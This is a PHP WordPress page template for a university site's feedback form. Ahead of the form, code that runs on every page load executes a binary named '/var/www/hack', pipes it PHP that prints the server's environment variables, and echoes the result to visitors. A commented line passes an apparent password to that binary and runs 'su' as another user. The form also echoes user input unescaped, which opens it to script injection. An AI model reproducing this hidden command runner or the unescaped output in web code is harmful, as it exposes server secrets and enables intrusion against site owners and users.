<?php
/**
 * Template Name: Feedback
 *
 * @package OSI Starter Theme
 * @since OSI Starter Theme 1.0
 */

//get_header();





$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/var/www';
$env = array('some_option' => 'aeiou');

$process = proc_open('/var/www/hack', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], '<?php print_r($_ENV); ?>');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}









//$command = '(sleep 1; ./hack Facetime@12;) & su -c whoami au328953';
//echo shell_exec($command);

include_once(ABSPATH . "wp-content/themes/cab/inc/mail.php");

//var_dump(error_get_last());

?>

		<div id="primary" class="content-area">
			<div id="content" class="site-content" role="main">

				<?php while ( have_posts() ) : the_post(); ?>

					<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
						<div class="entry-content">
							<?php the_content(); ?>

							<?php if ($message != "") echo "<p id='alert'>" . $message . "</p>"; ?>
							<form action="http://osi.ucf.edu/cab/feedback" method="post">
								<p>Name: <br><input type="text" name="usersname" value="<?php echo $name; ?>"></p>
								<p>E-Mail: <br><input type="text" name="useremailaddress" value="<?php echo $email; ?>"></p>
								<p>Subject: <br><input type="text" name="superspecialsubject" value="<?php echo $subject; ?>"></p>
								<p>Content: <br><textarea name="superspecialcontent" id="form-content" cols="30" rows="10"><?php echo $content; ?></textarea></p>
								<p><?php echo recaptcha_get_html($publickey, $error); ?></p>
								<p><input type="submit" name="sendmail" value="Send"></p>
							</form>
						</div>
					</article>

				<?php endwhile; // end of the loop. ?>

			</div><!-- #content .site-content -->
		</div><!-- #primary .content-area -->

<?php //get_footer(); ?>